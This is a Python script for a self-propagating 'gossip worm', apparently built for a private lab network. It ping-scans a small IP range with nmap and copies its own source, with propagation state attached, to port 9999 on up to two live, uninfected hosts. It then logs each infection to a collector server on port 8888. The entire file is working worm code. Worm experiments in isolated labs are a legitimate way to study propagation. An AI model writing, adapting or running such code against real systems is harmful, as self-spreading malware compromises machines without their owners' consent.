import socket
import nmap
import json
import os
from datetime import datetime

COLLECTOR_IP = "192.168.100.10"
COLLECTOR_PORT = 8888
WORM_PORT = 9999
IP_RANGE = [f"192.168.100.{i}" for i in range(11, 16)]

def get_my_ip():
    print("[*] Determining local IP...")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.100.1", 80))
    ip = s.getsockname()[0]
    s.close()
    print(f"[+] My IP: {ip}")
    return ip

def is_alive(ip):
    nm = nmap.PortScanner()
    nm.scan(hosts=ip, arguments='-sn -T4')
    return nm[ip].state() == 'up' if ip in nm.all_hosts() else False

def send_log(data):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((COLLECTOR_IP, COLLECTOR_PORT))
        s.sendall(json.dumps(data).encode())
        s.close()
        print("[+] Log sent")
    except:
        print("[-] Failed to send log")

def spread(target_ip, my_ip, hop_count, infected):
    try:
        with open(__file__, "r") as f:
            lines = f.readlines()
        if lines[0].startswith("# STATE:"):
            lines = lines[1:]
        worm_code = "".join(lines)

        state = json.dumps({
            "source_ip": my_ip,
            "hop_count": hop_count,
            "infected": infected
        })
        final_code = f"# STATE:{state}\n" + worm_code

        import time
        start = time.time()
        s = socket.socket()
        s.settimeout(5)
        s.connect((target_ip, WORM_PORT))
        s.sendall(final_code.encode())
        s.close()
        elapsed = round(time.time() - start, 2)
        print(f"[+] Spread successful ({elapsed}s)")
        return True, elapsed

    except Exception as e:
        print(f"[-] Spread failed: {target_ip} — {e}")
        return False, 0

def main():
    if os.path.exists("/tmp/w2_lock"):
        print("[!] Already running — exiting")
        return
    open("/tmp/w2_lock", "w").close()

    print("================================")
    print("      W2 GOSSIP WORM START      ")
    print("================================")

    my_ip = get_my_ip()

    try:
        with open(__file__, "r") as f:
            first_line = f.readline()
        if first_line.startswith("# STATE:"):
            state = json.loads(first_line[8:])
            source_ip = state["source_ip"]
            hop_count = state["hop_count"]
            infected = state["infected"]
            print(f"[+] State loaded — source: {source_ip}, hop: {hop_count}")
        else:
            raise ValueError("no state")
    except:
        source_ip = my_ip
        hop_count = 0
        infected = [my_ip]
        print("[+] Fresh start on Kali")

    my_index = IP_RANGE.index(my_ip) if my_ip in IP_RANGE else -1

    # find 2 targets starting from own IP upward
    targets = []
    for ip in IP_RANGE[my_index + 1:]:
        if len(targets) == 2:
            break
        if ip in infected:
            print(f"[~] {ip} already infected, skipping")
            continue
        print(f"[*] Checking {ip}...")
        if is_alive(ip):
            targets.append(ip)
            print(f"[+] Found alive host: {ip}")

    if not targets:
        print("[!] No targets found — stopping")
        os.remove("/tmp/w2_lock")
        return

    for target in targets:
        hop_count += 1
        success, elapsed = spread(target, my_ip, hop_count, infected)
        if success:
            log = {
                "worm_type": "W2_gossip",
                "source_ip": my_ip,
                "infected_ip": target,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "hop_count": hop_count,
                "live_hosts_found": IP_RANGE,
                "open_ports": {},
                "spread_to": target,
                "spread_success": True,
                "time_to_spread": elapsed
            }
            send_log(log)
            infected.append(target)
            print(f"[+] Infection chain: {infected}")

    os.remove("/tmp/w2_lock")

main()